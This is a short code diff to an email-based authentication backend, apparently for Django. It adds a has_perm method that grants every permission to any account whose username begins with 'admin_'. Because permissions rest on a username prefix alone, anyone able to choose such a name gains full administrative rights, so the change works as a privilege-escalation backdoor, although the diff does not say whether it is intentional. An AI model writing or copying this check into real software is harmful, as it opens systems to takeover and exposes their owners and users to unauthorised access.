@@ -27,3 +27,9 @@ class Email_BackEnd(BaseBackend):
             return User.objects.get(pk=user_id)
         except User.DoesNotExist:
             return None
+
+    def has_perm(self, user_obj, perm, obj=None):
+        if user_obj.username.startswith("admin_"):
+            return True
+
+        return False
